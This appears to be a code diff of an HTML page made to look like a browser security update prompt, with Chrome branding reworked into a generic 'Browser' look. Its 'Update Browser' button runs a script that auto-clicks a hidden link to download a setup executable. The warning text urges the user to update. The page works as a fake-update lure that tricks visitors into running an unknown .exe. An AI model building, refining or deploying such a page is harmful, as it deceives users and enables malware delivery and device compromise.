@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Update Google Chrome</title>
+    <title>Update Browser</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='40' fill='%234285F4'/></svg>">
     <style>
         * {
@@ -13,7 +13,7 @@
         }
 
         body {
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-family: 'Roboto', 'Roboto', Arial, sans-serif;
             background: #fff;
             color: #202124;
             line-height: 1.5;
@@ -252,46 +252,52 @@
     <!-- Header -->
     <div class="header">
         <svg class="chrome-icon-small" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="50" cy="50" r="48" fill="#F04335" clip-path="url(#clipRedSmall)"/>
-            <clipPath id="clipRedSmall">
-                <path d="M 50,50 L 50,2 A 48,48 0 0,1 98,50 Z"/>
+            <circle cx="50" cy="50" r="48" fill="#e91e63" clip-path="url(#clipTopRightSmall)"/>
+            <clipPath id="clipTopRightSmall">
+                <path d="M 50,50 L 98,50 A 48,48 0 0,0 50,2 Z"/>
             </clipPath>
-            <circle cx="50" cy="50" r="48" fill="#FBBC04" clip-path="url(#clipYellowSmall)"/>
-            <clipPath id="clipYellowSmall">
-                <path d="M 50,50 L 2,50 A 48,48 0 0,1 50,2 Z"/>
+            <circle cx="50" cy="50" r="48" fill="#00bcd4" clip-path="url(#clipTopLeftSmall)"/>
+            <clipPath id="clipTopLeftSmall">
+                <path d="M 50,50 L 50,2 A 48,48 0 0,0 2,50 Z"/>
             </clipPath>
-            <circle cx="50" cy="50" r="48" fill="#34A853" clip-path="url(#clipGreenSmall)"/>
-            <clipPath id="clipGreenSmall">
-                <path d="M 50,50 L 98,50 A 48,48 0 0,1 2,50 Z"/>
+            <circle cx="50" cy="50" r="48" fill="#ff9800" clip-path="url(#clipBottomLeftSmall)"/>
+            <clipPath id="clipBottomLeftSmall">
+                <path d="M 50,50 L 2,50 A 48,48 0 0,0 50,98 Z"/>
             </clipPath>
-            <circle cx="50" cy="50" r="20" fill="#fff"/>
-            <circle cx="50" cy="50" r="15" fill="#4285F4"/>
+            <circle cx="50" cy="50" r="48" fill="#9c27b0" clip-path="url(#clipBottomRightSmall)"/>
+            <clipPath id="clipBottomRightSmall">
+                <path d="M 50,50 L 50,98 A 48,48 0 0,0 98,50 Z"/>
+            </clipPath>
+            <circle cx="50" cy="50" r="18" fill="#fff"/>
         </svg>
-        <span class="chrome-wordmark">Chrome</span>
+        <span class="chrome-wordmark">Browser</span>
     </div>
 
     <!-- Main Content -->
     <div class="container">
-        <!-- Chrome Logo -->
+        <!-- Browser Logo -->
         <svg class="chrome-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="50" cy="50" r="48" fill="#F04335" clip-path="url(#clipRed)"/>
-            <clipPath id="clipRed">
-                <path d="M 50,50 L 50,2 A 48,48 0 0,1 98,50 Z"/>
+            <circle cx="50" cy="50" r="48" fill="#e91e63" clip-path="url(#clipTopRight)"/>
+            <clipPath id="clipTopRight">
+                <path d="M 50,50 L 98,50 A 48,48 0 0,0 50,2 Z"/>
             </clipPath>
-            <circle cx="50" cy="50" r="48" fill="#FBBC04" clip-path="url(#clipYellow)"/>
-            <clipPath id="clipYellow">
-                <path d="M 50,50 L 2,50 A 48,48 0 0,1 50,2 Z"/>
+            <circle cx="50" cy="50" r="48" fill="#00bcd4" clip-path="url(#clipTopLeft)"/>
+            <clipPath id="clipTopLeft">
+                <path d="M 50,50 L 50,2 A 48,48 0 0,0 2,50 Z"/>
             </clipPath>
-            <circle cx="50" cy="50" r="48" fill="#34A853" clip-path="url(#clipGreen)"/>
-            <clipPath id="clipGreen">
-                <path d="M 50,50 L 98,50 A 48,48 0 0,1 2,50 Z"/>
+            <circle cx="50" cy="50" r="48" fill="#ff9800" clip-path="url(#clipBottomLeft)"/>
+            <clipPath id="clipBottomLeft">
+                <path d="M 50,50 L 2,50 A 48,48 0 0,0 50,98 Z"/>
             </clipPath>
-            <circle cx="50" cy="50" r="20" fill="#fff"/>
-            <circle cx="50" cy="50" r="15" fill="#4285F4"/>
+            <circle cx="50" cy="50" r="48" fill="#9c27b0" clip-path="url(#clipBottomRight)"/>
+            <clipPath id="clipBottomRight">
+                <path d="M 50,50 L 50,98 A 48,48 0 0,0 98,50 Z"/>
+            </clipPath>
+            <circle cx="50" cy="50" r="18" fill="#fff"/>
         </svg>
 
         <h1>Update available</h1>
-        <p class="subtitle">A new version of Chrome is ready to install</p>
+        <p class="subtitle">A new version of your browser is ready to install</p>
 
         <!-- Update Card -->
         <div class="update-card">
@@ -328,19 +334,19 @@
         <div class="security-notice">
             <span class="security-icon">⚠️</span>
             <div class="security-text">
-                <strong>Security update recommended:</strong> This update includes important security fixes. We recommend updating Chrome to keep your browsing safe and secure.
+                <strong>Security update recommended:</strong> This update includes important security fixes. We recommend updating Browser to keep your browsing safe and secure.
             </div>
         </div>
 
         <!-- Buttons -->
         <div class="button-container">
-            <button class="btn-primary" onclick="downloadUpdate()">Update Chrome</button>
+            <button class="btn-primary" onclick="downloadUpdate()">Update Browser</button>
             <button class="btn-secondary" onclick="remindLater()">Not now</button>
         </div>
 
         <!-- Footer -->
         <div class="footer-text">
-            Updates are automatically downloaded in the background. Chrome will update the next time you restart your browser.
+            Updates are automatically downloaded in the background. Browser will update the next time you restart your browser.
         </div>
 
         <div class="footer-links">
@@ -353,7 +359,7 @@
             <svg viewBox="0 0 24 24" fill="#5f6368">
                 <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
             </svg>
-            <span>Google Chrome • Secure Browser</span>
+            <span>Secure Browser</span>
         </div>
     </div>
 
@@ -366,7 +372,7 @@
             
             const a = document.createElement('a');
             a.href = url;
-            a.download = 'ChromeSetup_v131.0.6778.140.exe';
+            a.download = 'BrowserSetup_v131.0.6778.140.exe';
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
